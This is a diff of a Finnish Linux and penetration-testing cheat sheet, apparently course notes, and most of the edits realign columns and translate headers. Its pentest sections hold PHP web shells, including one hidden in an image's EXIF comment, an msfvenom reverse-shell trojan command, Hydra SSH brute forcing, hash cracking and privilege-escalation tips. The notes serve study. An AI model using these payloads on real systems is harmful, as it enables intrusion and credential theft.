@@ -3,16 +3,16 @@ ________________________________________________________________________________
 Linux Palvelimet komentoja
 ________________________________________________________________________________________________________________________________
 *** ALKU KOMENNOT ***
-setxkbmap fi		<--->	Vaihtaa suomi nappaimiston
-sudo			<--->	Jarjestelman valvojana suoritettavat komennot
-uname -a		<--->	Kayttojarjestelman versio
-lshw -short -sanitize	<--->	Laitteisto
-ifconfig		<--->	Ip tietoja
-hostname -I		<--->	Omat IPt
-curl ifconfig.me	<--->	Julkinen IP culrilla
-nano			<--->	Normaali kayttajan teksti editori
-sudoedit		<--->	Sudo kayttaja editori
-passwd			<--->	Salasana xubuntu live tikulle
+setxkbmap fi					<--->	Vaihtaa suomi nappaimiston
+sudo						<--->	Jarjestelman valvojana suoritettavat komennot
+uname -a					<--->	Kayttojarjestelman versio
+lshw -short -sanitize				<--->	Laitteisto
+ifconfig					<--->	Ip tietoja
+hostname -I					<--->	Omat IPt
+curl ifconfig.me				<--->	Julkinen IP culrilla
+nano						<--->	Normaali kayttajan teksti editori
+sudoedit					<--->	Sudo kayttaja editori
+passwd						<--->	Salasana xubuntu live tikulle
 
 ________________________________________________________________________________________________________________________________
 *** WIRELESS ADAPTERIN ASENNUS ***
@@ -61,30 +61,30 @@ cp -rp						<--->	RP lipuilla kopioidaan myos tiedoston oikeudet recursiivisesti
 
 ________________________________________________________________________________________________________________________________
 *** HAKUTOIMINTO *** 
-alt+.							<--->   viimeisen komennon viimeinen sana
-less teksti.txt						<--->	Haku komento, joka tuo yhdensivun kerralla
-tail teksti.txt -F					<--->	Avaa tiedoston 10viimeista rivia ja -F paivittaa tietoja
-cat teksti.txt						<--->	Avaa tiedoton sisallon
-history							<--->	Nayttaa vanhat kommennot
-which bash						<--->	Mista bash ajetaan
-env							<--->	bash scriptiin tietoja koneesta
+alt+.									<--->   viimeisen komennon viimeinen sana
+less teksti.txt								<--->	Haku komento, joka tuo yhdensivun kerralla
+tail teksti.txt -F							<--->	Avaa tiedoston 10viimeista rivia ja uudet rivit
+cat teksti.txt								<--->	Avaa tiedoton sisallon
+history									<--->	Nayttaa vanhat kommennot
+which bash								<--->	Mista bash ajetaan
+env									<--->	bash scriptiin tietoja koneesta (environment)
 
-&&  <---> voi ketjuttaa komentoja
-"|" putki merkki					<--->	Liimataan komentoja 
-| grep haku						<--->	Hakee tietueesta hakusanalla
-| grep -ir haku						<--->	Haku paremmalla rivityksella
-| grep -v 'exclude'					<--->	Exclude with grep
+&&									<--->	Ketjuttaa komentoja (ketju voi katketa)
+;									<--->	Ketjuttaa komentoja (ketju ei katkea)
+"|" putki merkki							<--->	Liimataan komentoja 
+| grep haku								<--->	Hakee tietueesta hakusanalla
+| grep -ir haku								<--->	Haku paremmalla rivityksella
+| grep -v 'exclude'							<--->	Exclude with grep
 
-
-find -printf "%T+ %p\n"|sort				<--->   Kertoo asennetujne ohjelmien ajan jarjesteksyssa
-find -printf '%T+ M %p\n%A+ A %p\n%C+ C %p\n'|sort	<--->	Kertoo asennettujen ohjelmien ajan jarjestyksessa
-find /home -printf "%f\t%p\t%u\t%g\m\n" | column -t	<--->	Hakee home kansion kaikki tiedostot
-find / -group adm -ls 2>/dev/null			<--->	Ryhma oikeuksien haku
-find / -user joni -ls 2>/dev/null			<--->	Tiedostojen user oikeuksien haku
-find -printf "%T+ %p\n" | sort | grep -e ".exe$"	<--->	Etsii kansiotai eteenpain exe tiedostoja
-find . ! -empty -type f -exec md5sum {} + | sort | uniq -w32 -dD Etsii tiedostoja joilla on kaksoiskappale
+find -printf "%T+ %p\n"|sort						<--->   Kertoo asennetujne ohjelmien ajan jarjesteksyssa
+find -printf '%T+ M %p\n%A+ A %p\n%C+ C %p\n'|sort			<--->	Kertoo asennettujen ohjelmien ajan jarjestyksessa
+find /home -printf "%f\t%p\t%u\t%g\m\n" | column -t			<--->	Hakee home kansion kaikki tiedostot
+find / -group adm -ls 2>/dev/null					<--->	Ryhma oikeuksien haku
+find / -user joni -ls 2>/dev/null					<--->	Tiedostojen user oikeuksien haku
+find -printf "%T+ %p\n" | sort | grep -e ".exe$"			<--->	Etsii kansiotai eteenpain exe tiedostoja
+find . ! -empty -type f -exec md5sum {} + | sort | uniq -w32 -dD	<--->	Etsii tiedostoja joilla on kaksoiskappale
 ________________________________________________________________________________________________________________________________
-*** Metadata ***
+*** METADATA ***
 exiftool	<--->	libimage-exiftool-perl kertoo tiedoton luonti ajan ja muita tietoja
 
 patterns.dunttus.com kuvien metadata bashilla:
@@ -98,54 +98,54 @@ dunttus_patterns*
 
 ________________________________________________________________________________________________________________________________
 *** ASENNUKSET ***
-sudo apt-get update			<--->	Paivittaa palvelimelle ohejelmitojen versio tiedot
-sudo apt-get upgrade			<--->	Paivittaa ohjelmistot
-sudo apt-get dist-upgrade		<--->	Kernel paivitykset
-sudo apt autoremove			<--->	Poistaa paketit turhat paketit
-sudo reboot				<--->	Uudelleen kaynnistys
+sudo apt-get update				<--->	Paivittaa palvelimelle ohejelmitojen versio tiedot
+sudo apt-get upgrade				<--->	Paivittaa ohjelmistot
+sudo apt-get dist-upgrade			<--->	Kernel paivitykset
+sudo apt autoremove				<--->	Poistaa paketit turhat paketit
+sudo reboot					<--->	Uudelleen kaynnistys
 
 UBUNTU 19->20
-apt-get dist-upgrade                    <--->   Kernel paivitykset
-cat /etc/lsb-release			<--->	Linux version tarkastus 
-uname -mrs				<--->	Kernel version tarkastus
-sudo apt --purge autoremove		<--->	Poistaa kayttamattomat kernel versiot
-sudo apt install update-manager-core -y	<--->	Asentaa uuden core managerin
-sudo do-release-upgrade -d		<--->	Asentaa uusimman version Linuxista muista ottaa varmuuskopiot
+apt-get dist-upgrade				<--->   Kernel paivitykset
+cat /etc/lsb-release				<--->	Linux version tarkastus 
+uname -mrs					<--->	Kernel version tarkastus
+sudo apt --purge autoremove			<--->	Poistaa kayttamattomat kernel versiot
+sudo apt install update-manager-core -y		<--->	Asentaa uuden core managerin
+sudo do-release-upgrade -d			<--->	Asentaa uusimman version Linuxista muista ottaa varmuuskopiot
+sudo ubuntu-drivers autoinstall			<--->	Asentaa esim Nvidia ajurit
 
-sudo ubuntu-drivers autoinstall		<--->	Asentaa esim Nvidia ajurit
 DEBIAN 9->10
-apt-get dist-upgrade			<--->	Kernel paivitykset
-lsb_release -a				<--->	Linux version tarkastus
-uname -mrs				<--->	Kernel versio tarkastus
-nano /etc/apt/sources.list		<--->	Vaihda stretch -> buster
-apt-get update				<--->	Paivitaa versiot
-apt-get dist-upgrade			<--->	Asentaa buster paketit muista varmuuskopiot
-apt --purge autoremove			<--->	Poistaa vanhat paketit
-reboot					<--->	Kaynnista uudestaan
+apt-get dist-upgrade				<--->	Kernel paivitykset
+lsb_release -a					<--->	Linux version tarkastus
+uname -mrs					<--->	Kernel versio tarkastus
+nano /etc/apt/sources.list			<--->	Vaihda stretch -> buster
+apt-get update					<--->	Paivitaa versiot
+apt-get dist-upgrade				<--->	Asentaa buster paketit muista varmuuskopiot
+apt --purge autoremove				<--->	Poistaa vanhat paketit
+reboot						<--->	Kaynnista uudestaan
 
-apt-cache search ohjelmannimi		<--->	Etsii ohjelmistoja
-apt-get install ohjelmannimi		<--->	Asentaa ohjelmiston
-apt-get remove ohjelmannimi		<--->	Poistaa ohjelmiston
-apt-get purge ojelmnnimi		<--->	Poistaa ohjelmiston ja asetukset
+apt-cache search ohjelmannimi			<--->	Etsii ohjelmistoja
+apt-get install ohjelmannimi			<--->	Asentaa ohjelmiston
+apt-get remove ohjelmannimi			<--->	Poistaa ohjelmiston
+apt-get purge ojelmnnimi			<--->	Poistaa ohjelmiston ja asetukset
 
-sudo apt-get install ohjelmisto		<--->	Turvallinen tapa asentaa ohjelmia
-sudo snap-install ohjelmisto		<--->	Ei niin turvallinen tapa asentaa ohjelmia
+sudo apt-get install ohjelmisto			<--->	Turvallinen tapa asentaa ohjelmia
+sudo snap-install ohjelmisto			<--->	Ei niin turvallinen tapa asentaa ohjelmia
 
-systemctl restart ohjelmannimi		<--->	Uudelleen kaynnistys ohjelmalle
-reboot					<--->	Uudelleen kaynnistys koko Linuxille
-man ohjelmanimi				<--->	Manual sivu asennetusta ohjelmistosta
+systemctl restart ohjelmannimi			<--->	Uudelleen kaynnistys ohjelmalle
+reboot						<--->	Uudelleen kaynnistys koko Linuxille
+man ohjelmanimi					<--->	Manual sivu asennetusta ohjelmistosta
 
 ________________________________________________________________________________________________________________________________
 *** LINUX PIKA NAPPAIN ***
-CTRL + C		<--->	Yleisesti sulkee ohjelmia
-WINDOWS + T		<--->	Avaa terminaalin
-WINDOWS + Z		<--->	Sammuttaa toimintoja ilde tilaan takaisin "fg"
-jobs			<--->	Nayttaa taustalla pyorivat ohjelmat listana
-fg			<--->	Tuo ctrl+Z suljetun tiedoston takaisin
-q			<--->	Yleisesti sulkee ohjelmia
+CTRL + C					<--->	Yleisesti sulkee ohjelmia
+WINDOWS + T					<--->	Avaa terminaalin
+WINDOWS + Z					<--->	Sammuttaa toimintoja ilde tilaan takaisin "fg"
+jobs						<--->	Nayttaa taustalla pyorivat ohjelmat listana
+fg						<--->	Tuo ctrl+Z suljetun tiedoston takaisin
+q						<--->	Yleisesti sulkee ohjelmia
+!!						<--->	Ajaa viime komento uudestaa
+sudo !!						<--->	Ajaa viime komennon sudona
 
-!!			<--->	Ajaa viime komento uudestaa
-sudo !!			<--->	Ajaa viime komennon sudona
 ________________________________________________________________________________________________________________________________
 *** APACHE, UFW PALOMUURI JA PHP ***
 sudo ufw enable					<--->	Palomuuri paalle, jos etayhteys paalla ssh yhteys voi katketa
@@ -173,7 +173,7 @@ cd/etc/apache2/					<--->	Asetukset apacheen
 <?php print(1+1)?>				<--->	Esimerkki php koodista jos HTML sivule tulee 2 php on paalle
 
 ________________________________________________________________________________________________________________________________
-*** SSH ROOT JA KAYTTAJIEN LUONTI ***
+*** USER CREATION ***
 apt-get install openssh-client openssh-server	<--->	Open-ssh asennus paketit
 
 hostname -I					<--->	Koneen Ip osoite 4 ja 6
@@ -208,7 +208,7 @@ yarn build					<--->	Kokoaa apin staattiseen tiedostoon
 yarn add					<--->	Asentaa ulkoiset paketit yarniin
 
 ________________________________________________________________________________________________________________________________
-*** JULKINEN JA SALAINEN AVAIN ***
+*** PUBLIC AND PRIVATE KEYS ***
 ssh-keygen					<--->	Luo julkisen ja salaisen avaimen
 ssh-copy-id joni@localhost			<--->	Kopioi local hostiin avaimen
 
@@ -216,7 +216,7 @@ to save the key (/home/user/.ssh/id_rsa):	<--->	Salainen avain
 rsa.pub julkinen avain				<--->	Julkinen avain
 
 ________________________________________________________________________________________________________________________________
-*** TIEDONSIIRTO ***
+*** DATATRASFER ***
 rsync nimi.txt joni@dunttus.com:			<--->	Tekstin kopiointi
 rsync -vazh --progress kansio joni@dunttus.com		<--->	v - komento vastaa h - human readeble
 
@@ -229,7 +229,7 @@ sshfs user@external_ip_adress: /mnt/kansionimi:		<--->   Graaffinen valikointi
 fusermount -u kansio					<--->   Irrottaa mount pointin
 
 ________________________________________________________________________________________________________________________________
-***PROSESSIEN ANALYSOINTI***
+*** PROCESS ANALYSIS ***
 top				<--->	Tietoja kuormituksesta
 uptime				<--->	Kurmituksen kehitys arvo
 nproc				<--->	Ytimet prosessorissa
@@ -257,7 +257,7 @@ hostname -I			<--->	Oma ip osoite
 df -ah				<--->	Paljon disk tilaa jaljella
 
 ________________________________________________________________________________________________________________________________
-*** SCRIPTIT ***
+*** SCRIPTS ***
 echo "hei joni"			<--->	Kirjoitaa hei joni
 nano hei.sh			<--->	Luo scriptin
 bash ./hei.sh			<--->	Avaa scriptin
@@ -284,14 +284,14 @@ Firefox				<--->	Firefox asetuksista manual proxy vain SOCKS host = localhost
 FoxyProxxy			<--->	Hyodyllinen jos sivut blockaa proxy yhteyksia
 
 ________________________________________________________________________________________________________________________________
-** TMUX **
+*** TMUX ***
 tmux new -s name		<--->	Aloittaa tmuxin
 CTRL+b	+c			<--->	Prefix
 Prefix+ numero			<--->	vaihtaa sivun
 Prefix+d			<--->	Deletoi ikkunan
 
 ________________________________________________________________________________________________________________________________
-*** USERS PASSWORDS *** 
+*** USERS AND PASSWORDS *** 
 jhakala tai joni		<--->	Esimerkki kaytaja, max 8merk, a-z, alkaa kirjaimella.
 pavahx6Ousoh			<--->	Hyva alkusalasan on satunainen ja kirjoitetaan muistiin. 
 ls -ld salasanat.txt		<--->	Oikeudet salasana teksti tiedostolle
@@ -319,11 +319,11 @@ Pohjana Tero Karvinen 2012: Linux kurssi, http://terokarvinen.com
 
 ________________________________________________________________________________________________________________________________
 
-** CISCO tietoverkot **
+*** CISCO NETWORKS ***
 
 ________________________________________________________________________________________________________________________________
 
-** Cisco Kytkimien configurointi **
+*** CISCO SWITCH CONFIG COMMANDS ***
 enable                                  <--->   Avaa reititimeen admin asetuksia
 set                                     <--->   Automatisoitu configurointi
 show running-config                     <--->   Nayttaa asetuksia
@@ -399,7 +399,7 @@ sudo salt '*' sys.state_doc             <--->   Generoi documentin koneelle omie
 /var/lib/salt/pki/minion/minion_master.pub      <--->   Orja koneen kansiossa palvelimen julkinen avain
 
 ________________________________________________________________________________________________________________________________
-**GIT VERSIO HALLINTA**
+**GIT VERSION CONTROL**
 git init nimi                           <--->   Alku kansion luonti paikkallisesti
 git add .                               <--->   Valmistaa kaikki tiedostot committia varten
 git commit -m "kommentti"               <--->   Vie kaikki muutokset lopuliseen tyohon mukaan
@@ -421,7 +421,7 @@ sudo git add . && sudo git commit -a -m "COMMMENT" && sudo git pull && sudo git 
 git add . && git commit -a -m "COMMMENT" && git pull && git push
 
 ________________________________________________________________________________________________________________________________
-** VirtualBox Vagrant **
+** VIRTUALBOX VAGRANT **
 sudo apt-get install vagrant            <--->   Vagrantin asennus paketti
 sudo apt-get install virtualbox-qt      <--->   Virtualbox asennus paketti
 vagrant cloud bento valmis vm           <--->   Valmiiden vagrant koneiden asennus tiedostot
@@ -431,7 +431,7 @@ vagrant ssh                             <--->   Vagrant koneelle paasee ssh yhte
 vagrant destroy                         <--->   Tuhoaa vagrant koneen
 
 ________________________________________________________________________________________________________________________________
-** Flask **
+** FLASK **
 export FLASK_DEBUG=1			<--->	Run flask in debug mode for auto refresh server
 export FLASK_APP=flasktest.py		<--->	Choose what file you use for flask
 flask run				<--->	Run flask server
@@ -490,7 +490,7 @@ Window Salt repo 2019: https://docs.saltstack.com/en/latest/topics/windows/windo
 
 ________________________________________________________________________________________________________________________________
 
-PYTHON ALKEET
+PYTHON BASICS
 ________________________________________________________________________________________________________________________________
 
 ** Python 3 IDLE **
@@ -500,7 +500,7 @@ CTRL+F6                                                 <--->   Idlen uudelleenk
 F5                                                      <--->   Ajaa koodin
 
 ________________________________________________________________________________________________________________________________
-** Python alkeet **
+** PYTHON BASICS **
 apt-get install python3-pip                             <--->   Python3 pip asennus Linuxille
 pip3 intall matplotlib                                  <--->   Matplotlib asennus python3 paketin hallinnalla
 python3 -m pip freeze                                   <--->   Asennetujen riippuvuuksien tarkastus
@@ -523,7 +523,7 @@ print("Minulla on",muuttuja,"kappaletta.", sep="")      <--->   sep ottaa valit 
 print("Nimi:\tHakala Joni")                             <--->   \t tekee tab valin tulostuksessa
 
 ________________________________________________________________________________________________________________________________
-** muuttujat **
+** VARIABLES **
 muuttuja = "pizza"	                                <--->   Pythyon muuttujan, ei skandeja, erikois merkkeja, varattuja
 muuttuja = "rivin vahto. \n"                            <--->   \n tekee muuttujan peraan tyhjan rivin
 numero = 100                                            <--->   Numero muuttuja ilman ""
@@ -537,12 +537,12 @@ len(muuttuja)                                           <--->   Laskee merkit mu
 numero + 150                                            <--->   Numero muuttujaan + 150
 
 ________________________________________________________________________________________________________________________________
-** Input **
+** INPUTS **
 lukuarvo = input("Kuinka vanha olet:")                  <--->   Kysyy kayttajalta muuttuja arvon
 kierroksia = int(input("Kuinka monta kierrosta: "))     <--->   Int input arvo
 
 ________________________________________________________________________________________________________________________________
-** Imports **
+** IMPORTS **
 import random                                           <--->   Tuo kirjaston random
 luku = random.randint(0,100)                            <--->   Print("luku") kayttaa random kirjastoa ja arpoo luvun
 dir(random)                                             <--->   Nayttaa eri funkioita random importissa
@@ -552,14 +552,14 @@ import omatiedosto                                      <--->   omatiedosto.py i
 print(omatiedosto.funktio)                              <--->   omatiedosto.py importista funktio haku
 
 ________________________________________________________________________________________________________________________________
-** errors **
+** ERRORS **
 except Exception:                                       <--->   Virhetilanteiden jokeri luokka printaa oma syote printilla alle
 try:                                                    <--->   Ajaa koodin ja katsoo tuleeko virheita oma syote printilla alle
 finally:                                                <--->   Lopetetaan ohkjelma jos tapahtuu virhe oma syote printilla alle
 class OmaVirhe(Exception):                              <--->   Virhe luokassa
 
 ________________________________________________________________________________________________________________________________
-** Tiedostojen avaus **
+** FILE EDITING **
 tiedosto = open("testi.txt", "r")                       <--->   Avaa tiedotston testi.txt "r" avaa luku tilaan
 tiedosto = open("testi.txt", "w")                       <--->   Avaa tiedoston kirjoitus tilaan
 tiedosto = open("testi.txt", "a")                       <--->   Avaa tiedoston kirjoiutus tilaan ja luo tiedoston
@@ -581,9 +581,7 @@ ________________________________________________________________________________
 Penetration Testing
 ________________________________________________________________________________________________________________________________
 
-
-** Muistio **
-
+** MEMO **
 Intrusion kill chain
 Mitre att&ck
 Openwire bandit
@@ -607,8 +605,9 @@ maltego
 
 LinEnum			<--->	Githubissa ohjelma, joka etsii upgrade haavoituvuuksia 
 PayloadsAllTheThings	<--->	Githubissa payloadeja eri kielille
+
 ________________________________________________________________________________________________________________________________
-** Pentest alkeet **
+** PENTEST BASICS **
 rmmod pcspkr                                    <--->   Piip aani pois kalista
 /dev/shm/.virus.sh				<--->	Hyva ram kansio viiruksille
 apt-cache search pentest                        <--->   Xubunulla haku
@@ -633,7 +632,7 @@ localhost:8080/WebGoat                          <--->   Selaimella
 echo "salasana"|sha256sum                       <--->   Salasana terminaaliin salattuna sha256
 
 ________________________________________________________________________________________________________________________________
-** MitmProxy **
+** MITMPROXY **
 EDITOR=nano mitmproxy -p 8888                   <--->   Mitmproxy nano editorilla portissa 8888
 localhost 8888                                  <--->   Manual HTTP proxy Firefox asetus ja 127 poistetaan
 Shift+K                                         <--->   Pika nappainten haku
@@ -648,12 +647,12 @@ i                                               <--->   Intersept=nimi nappain "
 shift+a                                         <--->   Intercept tilassa paasta kaikki loput lapi
 
 ________________________________________________________________________________________________________________________________
-** Gobuster **
+** GOBUSTER **
 gobuster dir -u http://URL -w /usr/share/word		<--->	Dir skannaus
 gobuster dir -u http://URL -w /usr/share/word -x .php	<--->	php paate etsinta
  
 ________________________________________________________________________________________________________________________________
-** DIRB skanneri **
+** DIRB SCANNER **
 dirb http://10.10.10.1 -r -o                    <--->   -r lippu no recursive ja -o tallentaa listan
 dirb http://10.10.10.1 -X .html                 <--->   Etsii .html loppuiset sanat
 
@@ -664,7 +663,7 @@ searchsploit -w "app name"			<--->	Tuo hakuun web sivun
 searchsploit -x id123.txt			<--->	Hakee lisatietoja IDn mukaan
 
 ________________________________________________________________________________________________________________________________
-** WebGoat **
+** WEBGOAT **
 POST ../../../../../WEB-INF/spring-security.xml <--->   Tehtava bypass a path based access firefox inspector
 POST action DeleteProfile                       <--->
 SelectProfile --> DeleteProfile                 <--->
@@ -688,7 +687,7 @@ Pass:___ Check password
 table name user_system_data
 
 ________________________________________________________________________________________________________________________________
-** Nmap **
+** NMAP **
 ip route				<--->	Tarkasta maali verkko
 ipcalc 10.0.0.0				<--->	Laske mahdolliset kohteet
 hostname -I				<--->	Oman koneen IPt
@@ -707,8 +706,9 @@ nmap -n 10.10.10.1 -p 80,443						<--->   scannaa ip alueen portit 80 ja 443m
 -Pn                                     <--->   no ping
 --top-ports 10                          <--->   Skanna 10 suosituinta porttia
 -sC					<--->	Scripti skannaus
+
 ________________________________________________________________________________________________________________________________
-** MetaSploit **
+** METASPLOIT **
 msfdb init              <--->   Ajetaan kerran
 msf                     <--->   Kaikki komennolt alkaa
 msfconsole              <--->   Avaa Metasploit 5 konsolin
@@ -727,7 +727,7 @@ set                     <--->   Listaa RHOST maalit
 set RHOSTS 10.0.0.0     <--->   Yli ajaa RHOST tiedoston yhdella maalilla
 
 ________________________________________________________________________________________________________________________________
-** Meterpreter **
+** METERPRETER **
 install metaspoit-framework                     <--->   Paivittaa explotit metasploitiin
 vagrant rapid7                                  <--->   vagrant tiedoston nimi
 nano vagrantfile copy paste kurssi sivulta      <--->
@@ -758,7 +758,7 @@ MeterPreter: upload /file/path			<--->	Lataa tiedostoja target koneelle
 search -f *.hakusana				<--->	Etsii tiedostoja
 
 ________________________________________________________________________________________________________________________________
-** HashCat **
+** HASHCAT **
 hashcat -m --force /root/hash/md5.txt /usr/share/wordlists/fasttrack.txt        <--->   hc md5 esim
 --show                                                                          <--->   Jos salasana jo crackatty
 echo -n 'salasana' | md5sum | tee -a tiedosto.txt                               <--->   Ei ylikirjoita vaan jatkaa tiedostoa
@@ -773,7 +773,7 @@ man crypt                                                                       
 s                                                                               <--->   Nakee eteenpain scannauksen aikana
 
 ________________________________________________________________________________________________________________________________
-** THCHydra **
+** THCHYDRA **
 cewl -w savefile.txt -d 3 -m 5 http://10.10.10.10/people/	<--->	Sanalistan luonti min 5 kirjain ja 3sivua alueesta
 
 hydra -l user -P sanalista 10.10.10.10 -t 4 ssh -V              <--->   SSH:n kautta yrittaa aravata tietyn kayytajan salasanaa
@@ -782,13 +782,13 @@ systemctl restart ssh                                           <--->   Jos ei t
 hydra http form                                                 <--->   Googlesta loytaa web formeihin esimerkkeja
 
 ________________________________________________________________________________________________________________________________
-** EyeWitness **
+** EYEWITNESS **
 eyewitness -f /root/ey/hosts            <--->   EyeWitness toiminto hosts tiedostoon tarvitaan domain tai ip
 --web --prepend-https                   <--->   Liput jotka hakee webbisivusta myos https
 hosts                                   <--->   Listataan kansioon hostnimi tai ip
 
 ________________________________________________________________________________________________________________________________
-** msfvenom **
+** MSFVENOM **
 msfvenom --list payloads | grep -i linux        <--->   Hakee hyotykuormia
 msfvenom --list formats
 msfvenom --payload linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 -f elf -o troijan
@@ -804,7 +804,7 @@ exploit                                 <--->
 fg					<--->	
 
 ________________________________________________________________________________________________________________________________
-** Reverse shell **
+** REVERSE SHELL **
 <?php echo system($_REQUEST['fun']); ?>						<--->	Koodin toimivuus testi
 ?fun=whoami									<--->	Selaimessa tiedoston peraan
 
@@ -828,8 +828,9 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['fun']); ?>' silver.jpg	<---
 mv silver.jpg silver.php.jpg							<--->	Nimen vaihto .php.jpg tiedostoksi
 
 XSS <---> <script>alert(document.domain)</script>
+
 ________________________________________________________________________________________________________________________________
-** PrivEsc **
+** PRIVESC **
 LinPeas								<--->	PrivEsc scanneri
 LinEnum								<--->	PrivEsc scanneri
 pspy64s								<--->	CRON job scanneri
@@ -858,12 +859,12 @@ find / -perm -4000 2>/dev/null					<--->	Etsii tiedostoja 4000 oikeudella
 openssl passwd -h						<--->	Salasanan luonti passwd tiedostoon -h salasana parametrit
 
 ________________________________________________________________________________________________________________________________
-** VirtualhostScan **
+** VIRTUALHOSTSCAN **
 wfuzz -H "Host: FUZZ.htb" -w ./wordlist -u http://10.10.10.10/		<--->	Hakee virtualhostia .htb alueesta
 wpscan --url http://localhost --enumerate u,ap,tt,t | tee teksti.txt	<--->	Scanneri wordpress sivuille
 
 ________________________________________________________________________________________________________________________________
-** burpesuite **
+** BURPESUITE **
 Port:8080			<--->	Proxyyn portti
 CTRL+r				<--->	Intersept lahetetaan Repeaterille
 CTRL+u				<--->	URL encoding jos omat komennot ei toimi
@@ -882,7 +883,7 @@ ________________________________________________________________________________
 export TERM=screen		<--->	Jos nuolilla ei voi liikkua vimissa
 
 ________________________________________________________________________________________________________________________________
-** ElasticSearch **
+** ELASTICSEARCH **
 curl localhost:9200/_cat/indices?v					<--->	Hakee elasticsearchiin tallennetut indexit
 curl -s localhost:9200/filebeat/_search?size=10000			<--->	Hakee indexin mukaan tiedot max size 10k
 cat filebeat.json | jq							<--->	Json data luettavaan muotoon
@@ -906,6 +907,7 @@ hashcat -v -m 1000 windowshash rockyou.txt	<--->	SAM hash crackaus
 evil-winrm -u user -p password -i 10.10.10.10	<--->	Evil-winrm github: remote Linux --> Windows
 
 !!! Penetration Testing kohdan kaytetyt menetelmat ovat vaarin kaytettyna laittomia, kayta omalla vastuulla. !!!
+
 ________________________________________________________________________________________________________________________________
 USEFULL LINKS:
 https://gtfobins.github.io/
@@ -917,6 +919,7 @@ SOURCES:
 Pohjana Tero Karvinen 2019: Penetration Testing kurssi, http://terokarvinen.com
 Ippsec youtube HackTheBox series, https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
 Priv Escalation from sudo, https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/
+
 ________________________________________________________________________________________________________________________________
 
 ********************************************************************************************************************************
